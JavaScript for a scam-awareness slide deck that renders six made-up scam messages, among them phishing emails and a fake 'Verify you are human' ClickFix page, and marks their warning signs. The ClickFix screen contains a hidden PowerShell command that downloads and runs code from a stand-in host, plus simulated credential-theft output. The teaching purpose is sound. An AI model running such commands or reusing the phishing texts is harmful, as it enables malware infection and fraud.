/* ============================================================================
   part-j.js - "Spot the scam" (both versions): five realistic scam messages, inserted after 'wa-privacy', in this order:
     'scam-parcel-sms'     SMS (iPhone Messages): unpaid parcel fee with a look-alike link
     'scam-hi-mum'         WhatsApp: "Hi Mum, it's me, new number" asking for money
     'scam-roblox-email'   email (desktop mail app): Roblox account "will be deleted", free Robux bait, link goes elsewhere
     'scam-whatsapp-code'  WhatsApp: a friend's stolen account asks for the 6-digit code that just arrived
     'scam-netflix-email'  email (desktop mail app): membership on hold, update your card, perfect English
     'scam-fake-captcha'   website (Windows + browser): a fake "Verify you are human" check (ClickFix). Plays out the attack:
                           first 4 clicks play the visitor's part (tick the box, Win+R, Ctrl+V, Enter: "Verified"), then
                           5 clicks reveal what went wrong: the jobs, the hidden clipboard command, the Run box, its hidden
                           start, and the PowerShell theft
   Each slide opens on the message alone and asks "would you ...?". Every click circles one warning sign on the screen
   (a numbered pin) and adds it to the "what to spot" list; the last one stamps SCAM and swaps the question for what to do
   instead. Back removes them again. The screens are HTML (crisp at any size), not pictures; all numbers, names, accounts
   and web addresses in them are made up.
   ============================================================================ */
(function () {
'use strict';
if (!window.Deck || !window.DECK_DATA) return;

function h(tag, cls, parent, html) { var e = document.createElement(tag); if (cls) e.className = cls; if (html != null) e.innerHTML = html; if (parent) parent.appendChild(e); return e; }
function addCss(id, rules) { if (document.getElementById(id)) return; var st = document.createElement('style'); st.id = id; st.textContent = rules.join('\n'); document.head.appendChild(st); }

/* ---------------------------------------------------------------- icons */
var SIG = '<svg viewBox="0 0 18 12" fill="currentColor"><rect y="8" width="3" height="4" rx="1"/><rect x="5" y="5.5" width="3" height="6.5" rx="1"/><rect x="10" y="3" width="3" height="9" rx="1"/><rect x="15" width="3" height="12" rx="1"/></svg>';
var WIFI = '<svg viewBox="0 0 16 12" fill="currentColor"><path d="M8 2.2c2.3 0 4.4.9 6 2.4l1.3-1.4A10.4 10.4 0 0 0 8 .3 10.4 10.4 0 0 0 .7 3.2L2 4.6a8.6 8.6 0 0 1 6-2.4zm0 3.6c1.3 0 2.5.5 3.4 1.3l1.3-1.4A6.8 6.8 0 0 0 8 3.9a6.8 6.8 0 0 0-4.7 1.8l1.3 1.4c.9-.8 2.1-1.3 3.4-1.3zM8 11.4l2.2-2.3A3 3 0 0 0 8 8.2c-.9 0-1.6.3-2.2.9z"/></svg>';
var BAT = '<svg viewBox="0 0 27 13"><rect x=".5" y=".5" width="23" height="12" rx="3.5" fill="none" stroke="currentColor" opacity=".45"/><rect x="2" y="2" width="16" height="9" rx="2" fill="currentColor"/><path d="M25 4.5v4c.8-.3 1.3-1.1 1.3-2s-.5-1.7-1.3-2z" fill="currentColor" opacity=".45"/></svg>';
var PERSON = '<svg viewBox="0 0 24 24" fill="#fff"><circle cx="12" cy="9" r="4.2"/><path d="M4 21c.6-4.2 3.9-6.6 8-6.6s7.4 2.4 8 6.6z"/></svg>';
var BACK = '<svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M11 6l-6 6 6 6"/></svg>';
var VIDEO = '<svg viewBox="0 0 24 24" fill="#fff"><rect x="2" y="6" width="14" height="12" rx="3"/><path d="M17 10.5 22 7.5v9l-5-3z"/></svg>';
var CALL = '<svg viewBox="0 0 24 24" fill="#fff"><path d="M6.6 10.8a15.2 15.2 0 0 0 6.6 6.6l2.2-2.2c.3-.3.7-.4 1-.2 1.1.4 2.3.6 3.6.6.6 0 1 .4 1 1V20c0 .6-.4 1-1 1A17 17 0 0 1 3 4c0-.6.4-1 1-1h3.5c.6 0 1 .4 1 1 0 1.3.2 2.5.6 3.6.1.3 0 .7-.2 1z"/></svg>';
var MIC = '<svg viewBox="0 0 24 24"><rect x="9" y="3" width="6" height="11" rx="3" fill="#fff"/><path d="M5.5 11a6.5 6.5 0 0 0 13 0M12 17.5V21" stroke="#fff" stroke-width="2" fill="none" stroke-linecap="round"/></svg>';
var BUBBLE = '<svg viewBox="0 0 24 24" fill="#fff"><path d="M12 3C6.5 3 2 6.7 2 11.2c0 2.6 1.5 4.9 3.8 6.4L5 21l4-2.1c.9.2 1.9.3 3 .3 5.5 0 10-3.7 10-8.2S17.5 3 12 3z"/></svg>';
var CURSOR = '<svg viewBox="0 0 24 24"><path d="M4 2l16 11.5-7 1.2 4.2 7.3-3 1.6-4.2-7.3L4 21z" fill="#000" stroke="#fff" stroke-width="1.4" stroke-linejoin="round"/></svg>';
function sb(cls) { return '<div class="sb ' + (cls || '') + '"><b>9:41</b><span>' + SIG + WIFI + BAT + '</span></div>'; }

/* ---------------------------------------------------------------- screens. data-f="n" marks what flag n circles (several
   elements may share n; the pin goes on the one with data-pin, else the first). data-pin="l" puts the pin on the left,
   "in" inside the right edge (for elements touching the edge of the screen). */
function waHead(av, name, sub, f) {
  return sb('wag') + '<div class="wa-h">' + BACK + '<div class="av"' + (av.length > 2 ? '' : ' style="background:#a35bd6"') + '>' + av + '</div>' +
    '<div class="who"><b data-f="' + f + '" data-pin="">' + name + '</b><small>' + sub + '</small></div><i>' + VIDEO + CALL + '</i></div>';
}
function waFoot() { return '<div class="wa-in"><div>Message</div><i>' + MIC + '</i></div>'; }
function tm(t, out) { return '<i class="tm">' + t + (out ? ' <u>✓✓</u>' : '') + '</i>'; }

function mail(o) {
  return '<div class="mw-tb"><i></i><i></i><i></i><span>Inbox &mdash; Mail</span></div><div class="mw-in">' +
    '<div class="mw-sd"><div class="on">Inbox<b>3</b></div><div>Starred</div><div>Sent</div><div>Drafts</div><div>Junk</div></div>' +
    '<div class="mw-rd"><div class="mw-sj"' + (o.sjF ? ' data-f="' + o.sjF + '"' : '') + '>' + o.subject + '</div>' +
    '<div class="mw-fr"><div class="av" style="background:' + o.avc + '">' + o.av + '</div><div class="who"><b>' + o.name + '</b> ' +
    '<span data-f="1">&lt;' + o.addr + '&gt;</span><small>to me</small></div><time>' + o.time + '</time></div>' +
    '<div class="mw-card"><div class="mw-bh" style="' + o.brandCss + '">' + o.brand + '</div><div class="mw-bd">' + o.body + '</div></div></div></div>';
}

/* ---------------------------------------------------------------- the fake "Verify you are human" page (ClickFix), drawn as a
   Windows desktop: browser on the look-alike check page, taskbar, and the Run box / PowerShell / clipboard reveal on top.
   Positions are px inside the 1020x880 screen (.pj-pc). Domain, ID and IP address are made up (203.0.113.x is reserved). */
function cloud(c) { return '<svg viewBox="0 0 64 34"><g fill="' + c + '"><circle cx="21" cy="20" r="9"/><circle cx="34" cy="14" r="12"/><circle cx="48" cy="21" r="8"/><rect x="12" y="20" width="44" height="9" rx="4.5"/></g></svg>'; }
var WIN = '<svg viewBox="0 0 20 20" fill="#0a74da"><rect x="1" y="1" width="8.3" height="8.3"/><rect x="10.7" y="1" width="8.3" height="8.3"/><rect x="1" y="10.7" width="8.3" height="8.3"/><rect x="10.7" y="10.7" width="8.3" height="8.3"/></svg>';
var STROKE = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">';
var NAV = STROKE + '<path d="M19 12H5M11 6l-6 6 6 6"/></svg>' + STROKE + '<path d="M5 12h14M13 6l6 6-6 6"/></svg>' + STROKE + '<path d="M20 12a8 8 0 1 1-2.4-5.7M20 4v5h-5"/></svg>';
var TUNE = STROKE + '<path d="M4 8h9M17 8h3M4 16h3M11 16h9"/><circle cx="15" cy="8" r="2"/><circle cx="9" cy="16" r="2"/></svg>';
var RUNIC = '<svg viewBox="0 0 40 40"><rect x="3" y="6" width="34" height="27" rx="2" fill="#fff" stroke="#5a6b80" stroke-width="2"/><rect x="4" y="7" width="32" height="5" fill="#3f8ae0"/><path d="M13 27l9-9M15 18h7v7" stroke="#2b8a3e" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>';
var DOMAIN = 'craftmods-hub.net', CFID = 'd3d28e7c13251934', BAD = 'powershell -w hidden -c "iwr craftmods-cdn.top/v | iex"';
function ppRow(n, txt, keys) { return '<div class="pp-row pr' + n + '"><i class="pp-n">' + n + '</i><span>' + txt + '</span><em>' + keys + '</em></div>'; }
var PS_LINES = [
  'PS C:\\Users\\Sam&gt; <b>iwr craftmods-cdn.top/v | iex</b>',
  'Downloading update.exe ............ done',
  'Reading saved passwords ........ 38 found',
  'Copying Roblox, Discord logins .... done',
  'Looking for crypto wallets ...... 1 found',
  '<em>Sending it all to 203.0.113.7 ..... sent</em>'
];
var WEB_HTML =
  '<div class="pc-br">' +
    '<div class="pc-tabs"><div class="pc-tab"><i class="fav">' + cloud('#f38020') + '</i><span>Just a moment...</span><b>&#x2715;</b></div><b class="pc-plus">+</b>' +
      '<div class="pc-wc"><i>&#x2500;</i><i>&#x25A2;</i><i>&#x2715;</i></div></div>' +
    '<div class="pc-tool">' + NAV + '<div class="pc-url">' + TUNE + '<span>' + DOMAIN + '</span></div><i class="pc-dots">&#x22EE;</i></div>' +
    '<div class="pc-pg">' +
      '<h1><i>' + cloud('#fff') + '</i>www.' + DOMAIN + '</h1>' +
      '<p class="pc-sub">Verify you are human by completing the action below.</p>' +
      '<div class="pc-cf"><i class="cf-bx"></i><i class="cf-sp"></i><span class="cf-t"><b>Verify you are human</b><b>Verifying&hellip;</b></span>' +
        '<div class="cf-lg">' + cloud('#f38020') + '<b>CLOUDFLARE</b><small>Privacy &middot; Terms</small></div></div>' +
      '<p class="pc-sec">www.' + DOMAIN + ' needs to review the security of your connection before proceeding.</p>' +
      '<div class="pc-dim"></div>' +
      '<div class="pc-pop">' +
        '<div class="pp-hd"><div><b>Verifying you are human</b><small>This may take a few seconds</small></div><div class="pp-lg">' + cloud('#fff') + '<b>CLOUDFLARE</b></div></div>' +
        '<div class="pp-bd"><div class="pp-h">Verification steps:</div><div class="pp-st" data-f="1" data-pin="">' +
          ppRow(1, 'Press Win + R', '<kbd>' + WIN + '</kbd>+<kbd>R</kbd>') +
          ppRow(2, 'Press Ctrl + V to paste the verification code', '<kbd>CTRL</kbd>+<kbd>V</kbd>') +
          ppRow(3, 'Press Enter to confirm', '<kbd>ENTER</kbd><kbd>&#x21B5;</kbd>') +
        '</div><div class="pp-ag">You will observe and agree:</div><div class="pp-code">I am not a robot - Cloudflare ID: ' + CFID + '</div></div>' +
        '<div class="pp-ft"><span>Perform the steps above to complete verification</span><b class="pp-btn"><u>VERIFY</u><u>&#x2713; VERIFIED</u></b></div>' +
      '</div>' +
    '</div>' +
  '</div>' +
  '<div class="pc-task"><div class="tk-c"><i>' + WIN + '</i><i><svg viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2" stroke-linecap="round"><circle cx="10.5" cy="10.5" r="6.5"/><path d="M15.5 15.5 21 21"/></svg></i>' +
    '<i><svg viewBox="0 0 24 24"><path d="M2 6a2 2 0 0 1 2-2h5l2 2h9a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2z" fill="#f4c13d"/></svg></i>' +
    '<i class="on"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#1a73e8"/><path d="M2 12h20M12 2c3.5 3 3.5 17 0 20M12 2c-3.5 3-3.5 17 0 20" stroke="#fff" stroke-width="1.4" fill="none"/></svg></i></div>' +
    '<div class="tk-r"><span>ENG</span><b>16:21</b></div></div>' +
  '<div class="pc-ps abs" data-f="5"><div class="ps-tb"><i>&gt;_</i>Windows PowerShell<span>&#x2500; &#x25A2; &#x2715;</span></div><div class="ps-bd">' +
    PS_LINES.map(function (l) { return '<div class="ps-l">' + l + '</div>'; }).join('') + '</div></div>' +
  '<div class="pc-clip abs" data-f="2"><div class="cl-h">&#x1F4CB; What clicking the box secretly copied</div>' +
    '<code><span class="bad">' + BAD.replace(/"/g, '&quot;') + '</span> <span class="ok"># I am not a robot - Cloudflare ID: ' + CFID + '</span></code>' +
    '<div class="cl-n"><b>Red:</b> downloads and runs a hidden program. <span>Grey: all you get to see.</span></div></div>' +
  '<div class="pc-run abs" data-f="3"><div class="rn-tb"><i>' + RUNIC + '</i>Run<b>&#x2715;</b></div>' +
    '<div class="rn-bd"><i class="rn-ic">' + RUNIC + '</i><p>Type the name of a program, folder, document, or Internet resource, and Windows will open it for you.</p></div>' +
    '<div class="rn-op"><span>Open:</span><div class="rn-in" data-f="4" data-pin="l"><div class="rn-sc"><span class="rn-tx">' + BAD.replace(/"/g, '&quot;') +
      '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# I am not a robot - Cloudflare ID: ' + CFID + '</span><i class="rn-ca"></i></div></div></div>' +
    '<div class="rn-bt"><b class="pri">OK</b><b>Cancel</b><b>Browse...</b></div></div>' +
  '<div class="pc-kv"></div>' +
  '<i class="pc-cur">' + CURSOR + '</i>';

var SCAMS = [
  { id: 'scam-parcel-sms', title: 'Spot the scam: parcel text', kind: 'phone', chip: 'SMS',
    ttl: 'Your parcel is <em>waiting</em>&hellip;', q: 'Would you tap the link?',
    ins: 'Don&rsquo;t tap. Check the delivery in the courier&rsquo;s own app, or type its website yourself.',
    scr: 'ms',
    html: sb() + '<div class="ms-h"><span class="bk">&lsaquo;</span><div class="av">' + PERSON + '</div>' +
      '<div class="nm" data-f="1">+44 7700 900417 &rsaquo;</div></div>' +
      '<div class="ms-b"><div class="ms-ts">Text Message<br>Today 08:47</div>' +
      '<div class="ms-m">Royal Mail: Your parcel RM48291035GB could not be delivered due to an unpaid shipping fee of <span data-f="3">&pound;1.45</span>. ' +
      '<span data-f="2">Please pay before 23:59 today</span> or it will be returned to sender:<br><span class="ln" data-f="4">https://royalmail.redelivery-uk.com/track</span></div>' +
      '<div class="ms-note">The sender is not in your contact list.<br><span class="ln">Report Junk</span></div></div>' +
      '<div class="ms-in"><b>+</b><div>Text Message</div></div>',
    flags: [
      ['A random mobile number', 'Delivery companies don&rsquo;t text from a personal number.'],
      ['&ldquo;Before 23:59 today&rdquo;', 'A deadline so you act before you think.'],
      ['A tiny fee: &pound;1.45', 'Too small to question. They want your card details, not &pound;1.45.'],
      ['A look-alike link', 'The real site name is the part just before .com: <b>redelivery-uk</b>, not Royal Mail.']
    ] },

  { id: 'scam-hi-mum', title: 'Spot the scam: “Hi Mum”', kind: 'phone', chip: 'WhatsApp',
    ttl: '&ldquo;Hi Mum, it&rsquo;s <em>me</em>&rdquo;', q: 'Would you send the money?',
    ins: 'Call your child on their <b>old</b> number, or ask something only they would know.',
    scr: 'wap',
    html: waHead(PERSON, '+44 7700 900283', 'online', 1) +
      '<div class="wa-b"><div class="wa-day">TODAY</div>' +
      '<div class="wa-unk" data-f="1">This number is not in your contacts<span><b>Block</b><b>Add</b></span></div>' +
      '<div class="wa-m i" data-f="2">Hi Mum 👋 it&rsquo;s me! Dropped my phone in the toilet 🙈 this is my new number, delete the old one' + tm('09:12') + '</div>' +
      '<div class="wa-m o">Oh no!! Are you ok?' + tm('09:14', 1) + '</div>' +
      '<div class="wa-m i">Mum I need a favour 🙏 got a bill to pay today and my banking app won&rsquo;t work on this phone' + tm('09:15') + '</div>' +
      '<div class="wa-m i" data-f="3">Can you send &pound;480 to this account? I&rsquo;ll pay you back tomorrow I promise ❤️<br>Name: J Mensah<br>Sort code: 20-45-77<br>Acc: 63018245' + tm('09:15') + '</div>' +
      '<div class="wa-m o">Can I call you?' + tm('09:17', 1) + '</div>' +
      '<div class="wa-m i" data-f="4">Can&rsquo;t talk rn, mic is broken 🙄 just text pls it&rsquo;s urgent' + tm('09:17') + '</div></div>' + waFoot(),
    flags: [
      ['A new, unknown number', '&ldquo;Delete the old one&rdquo; stops you checking with the real one.'],
      ['&ldquo;It&rsquo;s me&rdquo;, but no name', 'They wait for you to say the name for them.'],
      ['Money to a stranger&rsquo;s account', 'Your own child&rsquo;s bill isn&rsquo;t paid to a &ldquo;J Mensah&rdquo;.'],
      ['Won&rsquo;t take a call', 'A voice would give them away, so it stays on text.']
    ] },

  { id: 'scam-roblox-email', title: 'Spot the scam: Roblox email', kind: 'mail', chip: 'Email',
    ttl: 'Your Roblox account will be <em>deleted</em>', q: 'Would you click Verify?',
    ins: 'Never log in from an email link. Open the Roblox app yourself, and tell a parent.',
    html: mail({ subject: '<span data-f="3">⚠️ Final warning: your account will be deleted in 24 hours</span>', av: 'R', avc: '#e2231a', name: 'Roblox Support',
      addr: 'noreply@rob1ox-security.com', time: '07:52', brand: 'ROBLOX', brandCss: 'background:#232527;color:#fff',
      body: '<p><span data-f="2">Dear User,</span></p>' +
        '<p>We have detected suspicious activity on your account. <span data-f="3">Your account, your Robux and all your items will be permanently deleted within 24 hours</span> unless you verify your account.</p>' +
        '<div class="mw-cta"><span class="mw-btn" data-f="5">Verify my account</span><i class="cur">' + CURSOR + '</i>' +
        '<span class="mw-tip" data-f="5" data-pin="">https://roblox.com.account-verify.ru/login</span></div>' +
        '<p data-f="4" data-pin="l">🎁 As a thank-you for verifying, we will add <b>2,000 free Robux</b> to your account!</p>' +
        '<p class="sig">Roblox Security Team</p>' }),
    flags: [
      ['rob<i class="hl">1</i>ox, not roblox', 'A number 1 instead of the letter l. Read the address, not just the name.'],
      ['&ldquo;Dear User&rdquo;', 'Roblox knows your username. Scammers don&rsquo;t.'],
      ['A scary deadline', '&ldquo;Deleted in 24 hours&rdquo; is there to make you panic.'],
      ['Free Robux', 'Nobody gives away free Robux. It is always bait.'],
      ['The link goes somewhere else', 'Point at it first: <b>account-verify.ru</b> is not roblox.com.']
    ] },

  { id: 'scam-whatsapp-code', title: 'Spot the scam: “send me the code”', kind: 'phone', chip: 'WhatsApp',
    ttl: '&ldquo;Can you send me that <em>code</em>?&rdquo;', q: 'Would you send the code?',
    ins: 'Never share a code. Call your friend to check, and turn on two-step verification.',
    scr: 'wap',
    html: waHead('A', 'Aisha 💜', 'online', 1) +
      '<div class="wa-b"><div class="wa-day">TODAY</div>' +
      '<div class="wa-m o">are u coming to the park later?' + tm('16:02', 1) + '</div>' +
      '<div class="wa-m i">maybe!! 😄' + tm('16:20') + '</div>' +
      '<div class="wa-m i">heyy sorry I sent u a 6 digit code by mistake 🙈 can u send it back to me pls?' + tm('16:21') + '</div>' +
      '<div class="wa-m i" data-f="4">quick pls it&rsquo;s urgent!! I&rsquo;m getting locked out 😭😭' + tm('16:21') + '</div></div>' + waFoot() +
      '<div class="nb abs" data-f="2" data-pin="in"><div class="ic">' + BUBBLE + '</div><div><div class="hd"><b>Messages</b><span>now</span></div>' +
      '<p><b>WhatsApp</b><br>Your WhatsApp code: 482-917<br><span data-f="3">Don&rsquo;t share this code with others</span></p></div></div>',
    flags: [
      ['It&rsquo;s from a real friend', 'Their account has already been stolen. Now they want yours.'],
      ['The code came to <i class="hl">your</i> phone', 'It&rsquo;s the key to your WhatsApp. Someone is logging in as you.'],
      ['&ldquo;Don&rsquo;t share this code&rdquo;', 'WhatsApp tells you, right there in the message.'],
      ['Rush and panic', 'Send it and they take your account, then message all your friends.']
    ] },

  { id: 'scam-netflix-email', title: 'Spot the scam: Netflix email', kind: 'mail', chip: 'Email',
    ttl: 'Your membership is <em>on hold</em>', q: 'Would you update your card?',
    ins: 'Open the Netflix app or type netflix.com yourself. Never pay through an email link.',
    html: mail({ subject: 'Your membership is on hold &ndash; action required', av: 'N', avc: '#141414', name: 'Netflix',
      addr: 'billing@netflix-account-support.com', time: 'Yesterday', brand: 'NETFLIX', brandCss: 'background:#000;color:#e50914;letter-spacing:.12em',
      body: '<p><span data-f="2">Hi there,</span></p>' +
        '<p>We were unable to process the payment for your membership, so we have put your account on hold. To keep enjoying your favourite shows, please update your payment details.</p>' +
        '<p><span data-f="3">If we don&rsquo;t hear from you within 48 hours, your account will be suspended.</span></p>' +
        '<div class="mw-cta"><span class="mw-btn red" data-f="4">Update payment details</span></div>' +
        '<p class="sig">Thanks,<br>The Netflix Team</p>' }),
    flags: [
      ['Not from netflix.com', '<b>netflix-account-support.com</b> could belong to anyone.'],
      ['&ldquo;Hi there&rdquo;', 'Your real account knows your name.'],
      ['Pay in 48 hours or lose it', 'The deadline is there to make you rush.'],
      ['A button that wants your card', 'Never type card details after clicking an email link.'],
      ['Perfect English', 'AI writes flawless scams now. Don&rsquo;t wait for spelling mistakes.']
    ] },

  { id: 'scam-fake-captcha', title: 'Spot the scam: fake “I’m human” check', kind: 'web', chip: 'Website', pre: 4,
    ttl: 'Just prove you&rsquo;re <em>human</em>&hellip;', q: 'Would you do the 3 steps?',
    ins: 'Close the page. Real checks never ask you to press keys. Already did it? Tell an adult straight away.',
    html: WEB_HTML,
    flags: [
      ['A check that gives you <i class="hl">jobs</i>', 'A real &ldquo;I&rsquo;m not a robot&rdquo; check is one click. It never asks you to press keys.'],
      ['It secretly copied a command', 'Clicking the box put a hidden command on your clipboard.'],
      ['Win + R opens &ldquo;Run&rdquo;', 'Whatever you paste in there runs on your computer.'],
      ['You only see the end', 'The dangerous part is pushed out of sight. You see &ldquo;I am not a robot&rdquo;.'],
      ['Enter: you install it yourself', 'It runs hidden and steals saved passwords, game logins and more.']
    ],
    init: function (st, dev, ctx, k0) {
      st.gen = 0; st.kv = dev.querySelector('.pc-kv'); st.lines = dev.querySelectorAll('.ps-l');
      webScene(st, k0, false, ctx);
      if (!k0) { st.r.classList.add('w-load'); ctx.timeout(function () { st.r.classList.remove('w-load'); }, 1600); }
    },
    scene: webScene }
];

/* ---------------------------------------------------------------- styles */
var RED = '255,77,77';
addCss('pj-css', [
  '.pj{position:absolute;inset:0;font-family:var(--f-body);color:var(--ink)}',
  '.pj *{box-sizing:border-box}',
  /* right-hand column: kicker, title, question / answer, the list of warning signs */
  '.pj-col{position:absolute;top:96px;left:850px;width:960px}',
  '.pj.mail .pj-col,.pj.web .pj-col{left:1110px;width:760px}',
  '.pj-k{display:flex;gap:16px;align-items:center;font:700 20px/1 var(--f-body);letter-spacing:.2em;text-transform:uppercase;color:#ff8a8a}',
  '.pj-k span{letter-spacing:.04em;text-transform:none;padding:8px 18px;border-radius:99px;background:rgba(255,255,255,.08);color:#fff;box-shadow:inset 0 0 0 1.5px rgba(255,255,255,.25)}',
  '.pj-t{margin-top:22px;font:600 68px/1.05 var(--f-display);letter-spacing:-.02em;color:#fff}',
  '.pj.mail .pj-t,.pj.web .pj-t{font-size:60px}',
  '.pj-t em{font-style:italic;color:#ff6b6b}',
  '.pj-q{display:grid;margin-top:26px}',
  '.pj-q>*{grid-area:1/1;align-self:start;transition:opacity .5s,transform .5s var(--ease)}',
  '.pj-q .a{font:500 36px/1.25 var(--f-body);color:var(--ink2)}',
  '.pj-q .b{opacity:0;transform:translateY(14px);padding:14px 22px;border-radius:16px;background:rgba(46,229,157,.12);box-shadow:inset 0 0 0 2px rgba(46,229,157,.55);font:500 26px/1.35 var(--f-body);color:#d9ffe9}',
  '.pj-q .b em{font-style:normal;font-weight:800;color:#2ee59d;margin-right:10px}',
  '.pj.done .pj-q .a{opacity:0;transform:translateY(-14px)}',
  '.pj.done .pj-q .b{opacity:1;transform:none}',
  '.pj-fl{margin-top:30px;display:flex;flex-direction:column;gap:20px}',
  '.pj.mail .pj-fl,.pj.web .pj-fl{gap:14px}',
  '.pj-f{display:grid;grid-template-columns:50px 1fr;gap:18px;align-items:start;opacity:0;transform:translateX(30px);transition:opacity .45s,transform .55s var(--ease)}',
  '.pj-f.on{opacity:1;transform:none}',
  '.pj-f .n{width:50px;height:50px;border-radius:50%;background:rgb(' + RED + ');color:#fff;font:800 25px/50px var(--f-body);text-align:center;box-shadow:0 0 0 6px rgba(' + RED + ',.18)}',
  '.pj-f b{display:block;font:700 31px/1.2 var(--f-body);color:#fff}',
  '.pj-f span{display:block;margin-top:5px;font:400 24px/1.35 var(--f-body);color:var(--muted)}',
  '.pj-f span b{display:inline;font:inherit;font-weight:700;color:#ffb3b3}',
  '.pj-f .hl{font-style:normal;color:#ff8a8a}',
  /* what a warning sign looks like on the screen: a red ring, and its number in a pin */
  '.pj [data-f]{position:relative;transition:box-shadow .4s;-webkit-box-decoration-break:clone;box-decoration-break:clone}',
  '.pj .abs[data-f]{position:absolute}',
  '.pj span[data-f],.pj b[data-f]{border-radius:6px}',
  '.pj .hit{box-shadow:0 0 0 3px rgb(' + RED + '),0 0 22px rgba(' + RED + ',.7)!important}',
  '.pj span.hit:not(.mw-btn),.pj b.hit{background:rgba(' + RED + ',.16)}',
  '.pj-pin{position:absolute;top:-20px;right:-20px;width:40px;height:40px;border-radius:50%;background:rgb(' + RED + ');color:#fff;font:800 21px/40px var(--f-body);font-style:normal;text-align:center;',
  '  box-shadow:0 4px 14px rgba(0,0,0,.45);opacity:0;transform:scale(.3);transition:opacity .3s,transform .45s cubic-bezier(.3,1.6,.5,1);z-index:9;pointer-events:none;text-decoration:none;letter-spacing:0}',
  '.pj-pin.l{right:auto;left:-20px}',
  '.pj-pin.in{top:10px;right:12px}',
  '.pj .hit>.pj-pin{opacity:1;transform:none}',
  /* the stamp over the device once every sign is shown */
  '.pj-st{position:absolute;z-index:12;padding:8px 34px 12px;border:9px solid #ff3b3b;border-radius:20px;color:#ff3b3b;background:rgba(30,0,0,.55);font:900 104px/1 var(--f-body);letter-spacing:.08em;',
  '  text-shadow:0 0 30px rgba(255,59,59,.5);opacity:0;transform:rotate(-14deg) scale(1.8);transition:opacity .25s,transform .5s cubic-bezier(.3,1.5,.5,1);pointer-events:none}',
  '.pj.done .pj-st{opacity:.95;transform:rotate(-14deg)}',
  '.pj.phone .pj-st{left:560px;top:850px}',
  '.pj.mail .pj-st{left:640px;top:830px}',
  '.pj.web .pj-st{left:600px;top:800px}',
  /* phone */
  '.pj-ph{position:absolute;left:250px;top:58px;width:476px;height:968px;border-radius:72px;background:#0e0f12;padding:13px;box-shadow:0 0 0 2px #3a3b42,0 50px 100px rgba(0,0,0,.7)}',
  '.pj-ph .scr{position:relative;width:100%;height:100%;border-radius:60px;overflow:hidden;display:flex;flex-direction:column;background:#fff;color:#000}',
  '.pj-ph .isl{position:absolute;left:50%;top:14px;width:122px;height:35px;margin-left:-61px;border-radius:20px;background:#000;z-index:8}',
  '.pj .sb{height:60px;flex:none;display:flex;align-items:center;justify-content:space-between;padding:10px 40px 0 50px;font:600 21px/1 var(--f-body);color:#000}',
  '.pj .sb span{display:flex;gap:7px;align-items:center}.pj .sb svg{height:15px;width:auto}',
  /* iPhone Messages */
  '.ms-h{flex:none;position:relative;display:flex;flex-direction:column;align-items:center;padding:2px 0 14px;background:#f6f6f7;border-bottom:1px solid #dcdcde}',
  '.ms-h .bk{position:absolute;left:22px;top:2px;color:#0a84ff;font:300 58px/1 var(--f-body)}',
  '.ms-h .av{width:64px;height:64px;border-radius:50%;background:linear-gradient(#a8abb5,#85888f);display:grid;place-items:center}',
  '.ms-h .av svg{width:42px;height:42px;margin-top:6px}',
  '.ms-h .nm{margin-top:8px;padding:3px 8px;font:500 18px/1.1 var(--f-body);color:#000}',
  '.ms-b{flex:1;padding:16px 20px;overflow:hidden}',
  '.ms-ts{text-align:center;font:500 16px/1.35 var(--f-body);color:#8e8e93;margin:4px 0 14px}',
  '.ms-m{max-width:88%;background:#e9e9eb;border-radius:24px;padding:14px 18px;font:400 24px/1.36 var(--f-body);color:#000}',
  '.ms-m .ln{color:#0a84ff;text-decoration:underline;word-break:break-all}',
  '.ms-note{margin-top:16px;text-align:center;font:400 16px/1.45 var(--f-body);color:#8e8e93}.ms-note .ln{color:#0a84ff}',
  '.ms-in{flex:none;display:flex;gap:14px;align-items:center;padding:12px 20px 38px}',
  '.ms-in b{width:40px;height:40px;border-radius:50%;background:#e9e9eb;color:#7c7c80;font:400 30px/38px var(--f-body);text-align:center}',
  '.ms-in div{flex:1;height:44px;border-radius:22px;border:1.5px solid #d1d1d6;padding:0 18px;font:400 19px/41px var(--f-body);color:#b0b0b5}',
  /* WhatsApp */
  '.pj .sb.wag{background:#008069;color:#fff}',
  '.wa-h{flex:none;display:flex;align-items:center;gap:12px;padding:8px 18px 14px 14px;background:#008069;color:#fff}',
  '.wa-h>svg{width:30px;height:30px;flex:none}',
  '.wa-h .av{width:52px;height:52px;flex:none;border-radius:50%;background:#c4ccd0;display:grid;place-items:center;font:700 26px/1 var(--f-body);color:#fff;overflow:hidden}',
  '.wa-h .av svg{width:36px;height:36px;margin-top:6px}',
  '.wa-h .who{flex:1;min-width:0;display:flex;flex-direction:column;align-items:flex-start}',
  '.wa-h .who b{padding:1px 6px;margin-left:-6px;font:600 22px/1.2 var(--f-body)}',
  '.wa-h .who small{font:400 15px/1.2 var(--f-body);opacity:.85}',
  '.wa-h>i{display:flex;gap:22px}.wa-h>i svg{width:26px;height:26px}',
  '.wa-b{flex:1;display:flex;flex-direction:column;justify-content:flex-end;gap:8px;padding:14px 16px;background:#efeae2;overflow:hidden}',
  '.wa-day{align-self:center;padding:6px 14px;border-radius:9px;background:#fff;font:600 14px/1 var(--f-body);letter-spacing:.04em;color:#54656f;box-shadow:0 1px 1px rgba(0,0,0,.08)}',
  '.wa-unk{align-self:center;max-width:92%;padding:12px 18px;border-radius:12px;background:#fff;text-align:center;font:400 16px/1.35 var(--f-body);color:#54656f;box-shadow:0 1px 1px rgba(0,0,0,.08)}',
  '.wa-unk span{display:flex;justify-content:center;gap:40px;margin-top:8px}.wa-unk span b{font-weight:600;color:#008069}',
  '.wa-m{max-width:82%;padding:8px 13px 8px;border-radius:14px;font:400 20px/1.3 var(--f-body);color:#111b21;box-shadow:0 1px 1px rgba(0,0,0,.1)}',
  '.wa-m.i{align-self:flex-start;background:#fff;border-top-left-radius:4px}',
  '.wa-m.o{align-self:flex-end;background:#d9fdd3;border-top-right-radius:4px}',
  '.wa-m .tm{float:right;margin:9px 0 -5px 12px;font:400 13px/1 var(--f-body);font-style:normal;color:#667781}',
